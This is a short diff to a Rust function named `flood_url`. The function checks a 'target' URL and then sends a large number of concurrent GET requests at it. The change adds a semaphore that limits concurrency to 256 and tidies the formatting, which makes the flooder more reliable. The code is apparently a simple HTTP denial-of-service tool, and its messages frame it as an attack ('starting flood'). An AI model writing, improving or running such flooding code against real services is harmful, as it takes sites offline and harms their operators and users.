@@ -1,7 +1,9 @@
 use reqwest::Client;
+use std::sync::Arc;
+use tokio::sync::Semaphore;
 
 pub async fn flood_url(client: &Client, url: &str, requests: u32) {
-    let mut handles= Vec::new();
+    let mut handles = Vec::new();
 
     let Ok(resp) = client.head(url).send().await else {
         println!("Failed to connect to target");
@@ -9,10 +11,16 @@ pub async fn flood_url(client: &Client, url: &str, requests: u32) {
     };
     println!("Target check OK [{}], starting flood...", resp.status());
 
+    let concurrency_sem = Arc::new(Semaphore::new(256));
+
     for _ in 1..=requests {
         let client_clone = client.clone();
         let url_clone = url.to_string();
-        let handle = tokio::spawn(async move {client_clone.get(&url_clone).send().await});
+        let sem_clone = concurrency_sem.clone();
+        let handle = tokio::spawn(async move {
+            let _permit = sem_clone.acquire().await.unwrap();
+            client_clone.get(&url_clone).send().await
+        });
         handles.push(handle);
     }
 
